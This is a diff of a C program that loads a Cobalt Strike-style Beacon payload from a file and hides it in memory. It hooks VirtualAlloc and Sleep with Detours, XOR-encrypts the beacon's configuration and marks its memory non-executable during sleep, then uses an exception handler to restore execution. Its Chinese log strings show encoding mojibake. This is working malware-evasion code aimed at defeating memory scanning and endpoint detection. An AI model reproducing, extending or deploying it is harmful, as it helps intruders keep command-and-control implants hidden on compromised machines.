@@ -1,4 +1,4 @@
-ï»¿
+
 #include "stdio.h"
 #include<Windows.h>
 #include <string.h>
@@ -8,8 +8,8 @@
 #include "./Detours/include/detver.h"
 #pragma comment(lib,"./Detours/lib.X64/detours.lib")
 
-LPVOID Beacon_config;
-SIZE_T Beacon_config_length;
+LPVOID* Beacon_config;
+SIZE_T Beacon_config_length=0x800;
 LPVOID Beacon_address;
 SIZE_T Beacon_data_len;
 DWORD Beacon_Memory_address_flOldProtect;
@@ -22,7 +22,6 @@ int count = 0;
 
 static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
 
-
 void xor_result(char* src, int length)
 {
 	for (int i = 0; i < length; i++)
@@ -32,14 +31,16 @@ void xor_result(char* src, int length)
 }
 
 
+
 LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
-	count++;
 	if (dwSize != 0x4e000)
 		return OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
 	Beacon_data_len = dwSize;
 	Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
-	printf("Beacon åˆ†é…å¤§å°:%llx\n", Beacon_data_len);
-	printf("Beacon åˆ†é…åœ°å€:%p \n", Beacon_address);
+	Beacon_config = (LPVOID *)((DWORD_PTR)Beacon_address + 0x47718);
+	printf("Beacon ·ÖÅä´óÐ¡:%llx\n", Beacon_data_len);
+	printf("Beacon ·ÖÅäµØÖ·:%p \n", Beacon_address);
+	printf("Beacon_config ·ÖÅäµØÖ·:%p \n", Beacon_config);
 	return Beacon_address;
 }
 
@@ -51,20 +52,21 @@ void WINAPI NewSleep(DWORD dwMilliseconds)
 		VirtualFree(shellcode_addr, 0, MEM_RELEASE);
 		Vir_FLAG = false;
 	}
-	printf("sleepæ—¶é—´:%d\n", dwMilliseconds);
+	printf("sleepÊ±¼ä:%d\n", dwMilliseconds);
 	SetEvent(hEvent);
 	OldSleep(dwMilliseconds);
 }
 
 void Hook()
 {
-	DetourRestoreAfterWith(); //é¿å…é‡å¤HOOK
-	DetourTransactionBegin(); // å¼€å§‹HOOK
+	DetourRestoreAfterWith(); //±ÜÃâÖØ¸´HOOK
+	DetourTransactionBegin(); // ¿ªÊ¼HOOK
 	DetourUpdateThread(GetCurrentThread());
 	DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
 
+
 	DetourAttach((PVOID*)&OldSleep, NewSleep);
-	DetourTransactionCommit(); //  æäº¤HOOK
+	DetourTransactionCommit(); //  Ìá½»HOOK
 }
 
 void UnHook()
@@ -72,6 +74,7 @@ void UnHook()
 	DetourTransactionBegin();
 	DetourUpdateThread(GetCurrentThread());
 	DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
+
 	DetourTransactionCommit();
 }
 
@@ -81,24 +84,24 @@ BOOL is_Exception(DWORD64 Exception_addr)
 {
 	if (Exception_addr < ((DWORD64)Beacon_address + Beacon_data_len) && Exception_addr >(DWORD64)Beacon_address)
 	{
-		printf("åœ°å€ç¬¦åˆ:%llx\n", Exception_addr);
+		printf("µØÖ··ûºÏ:%llx\n", Exception_addr);
 		return true;
 	}
-	printf("åœ°å€ä¸ç¬¦åˆ:%llx\n", Exception_addr);
+	printf("µØÖ·²»·ûºÏ:%llx\n", Exception_addr);
 	return false;
 }
 
 LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
 {
 	printf("FirstVectExcepHandler\n");
-	printf("å¼‚å¸¸é”™è¯¯ç :%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);
-	printf("çº¿ç¨‹åœ°å€:%llx\n", pExcepInfo->ContextRecord->Rip);
+	printf("Òì³£´íÎóÂë:%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);
+	printf("Ïß³ÌµØÖ·:%llx\n", pExcepInfo->ContextRecord->Rip);
 	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))
 	{
-		printf("æ¢å¤Beaconå†…å­˜å±žæ€§\n");
-		xor_result((char*)Beacon_config, Beacon_config_length);
+		printf("»Ö¸´BeaconÄÚ´æÊôÐÔ\n");
+		xor_result((char*)*Beacon_config, Beacon_config_length);
 		VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
-		
+
 		return EXCEPTION_CONTINUE_EXECUTION;
 	}
 	return EXCEPTION_CONTINUE_SEARCH;
@@ -106,7 +109,7 @@ LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
 
 DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lpParameter)
 {
-	printf("Beacon_set_Memory_attributeså¯åŠ¨\n");
+	printf("Beacon_set_Memory_attributesÆô¶¯\n");
 	while (true)
 	{
 		WaitForSingleObject(hEvent, INFINITE);
@@ -117,9 +120,9 @@ DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lpParameter)
 		}
 		else
 		{
-			printf("è®¾ç½®Beaconå†…å­˜å±žæ€§ä¸å¯æ‰§è¡Œ\n");
+			printf("ÉèÖÃBeaconÄÚ´æÊôÐÔ²»¿ÉÖ´ÐÐ\n");
 			VirtualProtect(Beacon_address, Beacon_data_len, PAGE_READWRITE, &Beacon_Memory_address_flOldProtect);
-			xor_result((char*)Beacon_config, Beacon_config_length);
+			xor_result((char*)*Beacon_config, Beacon_config_length);
 			ResetEvent(hEvent);
 		}
 	}
@@ -164,41 +167,6 @@ unsigned char* ReadBinaryFile(const char* szFilePath, size_t* size)
 
 
 
-LONG WINAPI
-VectoredHandler(
-	struct _EXCEPTION_POINTERS* ExceptionInfo
-)
-{
-	LONG lResult = EXCEPTION_CONTINUE_SEARCH;
-	PEXCEPTION_RECORD pExceptionRecord;
-	PCONTEXT pContextRecord;
-
-	pExceptionRecord = ExceptionInfo->ExceptionRecord;
-	pContextRecord = ExceptionInfo->ContextRecord;
-
-	NTSTATUS stat;
-	DWORD_PTR Base_addr;
-
-	printf("ExceptionAddress = 0x%p\n", pExceptionRecord->ExceptionAddress);
-	DWORD dwOldProtect;
-	if (pExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT
-		&& LOWORD(pContextRecord->Rip) == 0x86BB)//åˆ¤æ–­åŽé¢å››ä½
-	{
-		Base_addr = pContextRecord->Rip - 0x86BB;
-		printf("RSP = 0x%p\n", pContextRecord->Rsp);
-		printf("RIP = 0x%p\n", pContextRecord->Rip);
-		printf("RCX = 0x%p\n", pContextRecord->Rcx);
-		//stat = VirtualProtect((PVOID*)Base_addr, 0x20000, PAGE_EXECUTE_READWRITE, &dwOldProtect);
-		Beacon_config_length = pContextRecord->Rcx;
-		Beacon_config = OldVirtualAlloc(0, pContextRecord->Rcx, MEM_COMMIT, PAGE_READWRITE);
-		pContextRecord->Rax = (DWORD_PTR)Beacon_config;
-		pContextRecord->Rip = pContextRecord->Rip + 5;
-		//pContextRecord->Rip -= 0x1;
-		//stat = VirtualProtect((PVOID*)Base_addr, 0x20000, PAGE_EXECUTE_READ, &dwOldProtect);
-		lResult = EXCEPTION_CONTINUE_EXECUTION;
-	}
-	return lResult;
-}
 
 //47718
 int main()
@@ -206,7 +174,6 @@ int main()
 	hEvent = CreateEvent(NULL, TRUE, false, NULL);
 
 	AddVectoredExceptionHandler(1, &FirstVectExcepHandler);
-	AddVectoredExceptionHandler(2, &VectoredHandler);
 	HANDLE hThread1 = CreateThread(NULL, 0, Beacon_set_Memory_attributes, NULL, 0, NULL);
 	CloseHandle(hThread1);
 
@@ -216,7 +183,7 @@ int main()
 	/* length: 892 bytes */
 	unsigned char* BinData = NULL;
 	size_t size = 0;
-	const char* szFilePath = "C:\\Users\\Lihua\\Desktop\\payload.bin";
+	const char* szFilePath = "C:\\Users\\Lihua\\Desktop\\payload2.bin";
 	BinData = ReadBinaryFile(szFilePath, &size);
 	//BinData = strreplace(BinData, ori_malloc,patch_malloc)
 
